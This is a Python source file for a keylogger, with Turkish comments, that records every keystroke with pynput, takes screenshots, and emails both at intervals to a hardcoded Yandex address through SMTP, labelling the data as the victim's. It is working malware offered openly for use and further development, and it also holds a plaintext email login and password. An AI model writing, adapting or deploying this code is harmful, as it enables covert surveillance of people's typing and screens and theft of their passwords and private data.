import os
import threading
import smtplib
from PIL import ImageGrab
from time import sleep
from email.message import EmailMessage
from pynput.keyboard import Key,KeyCode,Listener

"""
Bendeniz SemsYapar kodlamıştır
Keyloggerımızın screenshot ve klavye kaydı özellikleri mevcuttur
son hali değildir geliştirilmeye ve değiştirilmeye açıktır
"""

data=""

#veri aktarımı aralığını saniye olarak ifade eder isteğe bağlı olarak değiştirilebilir
count=10

def mail_at():
    global data,count
    
    dosyam = EmailMessage()
    dosyam["Subject"] = "Keylogs"
    
#gmailin kimden gidiceğini belirtiniz
    dosyam["From"] = "sems.yapar@yandex.com"

#gmailin kime gideceğini belirtiniz
    dosyam["To"] = "sems.yapar@yandex.com"
    
#gmail şifresi
    password = "za12345ZA"  
    
    dosyam.set_content(f"kurbanin {count} ekran goruntuleri ve klavye hareketleri..\n\n{data}")

#dosya ismi isteğe bağlı uzantısı hariç değiştirilir
    try: 
        with open("Data\\ScreenShot.png","rb") as dosya:
            dosyam_data = dosya.read()
            dosyam_name = dosya.name
    except(FileNotFoundError):
        pass
    dosyam.add_attachment(dosyam_data,maintype = "application",subtype = "octet-stream",filename = dosyam_name)

    mail = smtplib.SMTP("smtp.yandex.com",587)
    mail.ehlo()
    mail.starttls()
    mail.login(dosyam["From"],password)
    mail.send_message(dosyam)
    mail.quit()

def klavye_dinle():
    with Listener(on_press=klavye_kaydet) as klavye_dinle:
        klavye_dinle.join()
        
def klavye_kaydet(harf):
    global data
    if type(harf) == Key:
        harf = "[{}]".format(harf).replace("Key.","").upper()
        data += harf
    if type(harf) == KeyCode:
        data += str(harf).replace("'","")
def ss_bekle():    
    global data,count
    temp=data
    try:
        os.mkdir("Data")
    except(FileExistsError):
        pass
    while True:
        if len(temp)!=len(data):
            ss=ImageGrab.grab()
#dosya ismi isteğe bağlı uzantısı hariç değiştirilebilir
            ss.save("Data\\ScreenShot.png","JPEG")
            sleep(count)
            mail_at()
            temp=data
            data=""
            os.remove("Data\\ScreenShot.png")
            continue
        else:
            continue

thread1 = threading.Thread(target = klavye_dinle)
thread2 = threading.Thread(target = ss_bekle)

thread1.start()
thread2.start()

